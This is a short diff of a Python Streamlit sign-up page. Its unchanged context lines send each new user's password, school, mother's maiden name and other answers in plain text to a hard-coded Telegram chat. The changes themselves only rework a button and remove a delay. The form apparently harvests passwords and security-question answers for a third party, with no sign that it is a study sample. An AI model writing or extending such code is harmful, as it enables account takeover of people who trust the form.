@@ -39,6 +39,7 @@ chat_id = '630924196'
 placeholder = st.empty()
 signupbut = placeholder.button('Sign Up')
 
+ver = False
 if signupbut:
     placeholder.empty()
     tb.send_message(chat_id, 'New User: ' + new_user + '\n' + 'Password: ' + new_passwd + '\n' + 'School: ' + school + '\n' + 'Mother''s Maiden Name: ' + mom_name + '\n' + 'Vibe: ' + type + '\n' + 'Hotel: ' + hotel)
@@ -58,11 +59,9 @@ if signupbut:
         # here - st image with my letter
         tb.send_message(chat_id, 'images: ' + captcha)
         a = [eval('ph%s.empty()' % i) for i in range(1, 5)]
-        ph4 = st.empty()
-        ver2 = ph4.button('Vy')
+        ver2 = st.button('Vy')
 
-        import time
-        time.sleep(2)
+
 
 
 
